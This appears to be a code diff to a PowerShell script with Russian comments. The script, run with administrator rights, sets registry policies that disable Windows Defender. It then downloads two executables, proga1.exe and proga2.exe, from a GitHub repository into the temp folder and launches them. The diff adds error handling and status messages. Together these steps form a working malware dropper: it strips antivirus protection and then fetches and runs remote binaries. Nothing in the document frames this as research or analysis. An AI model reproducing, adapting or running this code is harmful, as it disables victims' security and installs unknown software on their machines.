@@ -19,32 +19,64 @@ if ((Test-Admin) -eq $false) {
 
 Set-Location "$workingDirOverride"
 
-# Отключение Defender
+# 1. ОТКЛЮЧЕНИЕ DEFENDER
 Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow
+
 $DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
-New-Item -Path "$DefenderPath\Real-Time Protection" -Force -ErrorAction SilentlyContinue
-Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
-Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force
+$RealTimeProtectionKey = "Real-Time Protection"
+
+if (!(Test-Path $DefenderPath)) { New-Item -Path $DefenderPath -Force }
+New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force -ErrorAction SilentlyContinue
+
+Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+
 Write-Host "Windows Defender DISABLED" -ForegroundColor Green
 
-# Скачивание и запуск файлов
+# 2. СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ
 Write-Host ""
 Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow
 
 $temp = $env:TEMP
 
+# Настройка для скачивания
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 # Первый файл
 Write-Host "[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
-Invoke-WebRequest -Uri "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe" -OutFile "$temp\proga1.exe" -UseBasicParsing
-Write-Host "Running proga1.exe" -ForegroundColor Green
-Start-Process "$temp\proga1.exe"
+try {
+    Invoke-WebRequest -Uri "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe" -OutFile "$temp\proga1.exe" -UseBasicParsing
+    if (Test-Path "$temp\proga1.exe") {
+        Write-Host "SUCCESS: proga1.exe downloaded" -ForegroundColor Green
+        Write-Host "Running proga1.exe..." -ForegroundColor Green
+        Start-Process -FilePath "$temp\proga1.exe"
+    } else {
+        Write-Host "FAILED: proga1.exe not downloaded" -ForegroundColor Red
+    }
+} catch {
+    Write-Host "ERROR: $_" -ForegroundColor Red
+}
+
+# Небольшая пауза между запусками
+Start-Sleep -Seconds 1
 
 # Второй файл
 Write-Host "[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
-Invoke-WebRequest -Uri "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe" -OutFile "$temp\proga2.exe" -UseBasicParsing
-Write-Host "Running proga2.exe" -ForegroundColor Green
-Start-Process "$temp\proga2.exe"
+try {
+    Invoke-WebRequest -Uri "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe" -OutFile "$temp\proga2.exe" -UseBasicParsing
+    if (Test-Path "$temp\proga2.exe") {
+        Write-Host "SUCCESS: proga2.exe downloaded" -ForegroundColor Green
+        Write-Host "Running proga2.exe..." -ForegroundColor Green
+        Start-Process -FilePath "$temp\proga2.exe"
+    } else {
+        Write-Host "FAILED: proga2.exe not downloaded" -ForegroundColor Red
+    }
+} catch {
+    Write-Host "ERROR: $_" -ForegroundColor Red
+}
 
 Write-Host ""
 Write-Host "=== ALL DONE ===" -ForegroundColor Green
-Pause
+Write-Host ""
+Write-Host "Press Enter to exit..."
+Read-Host
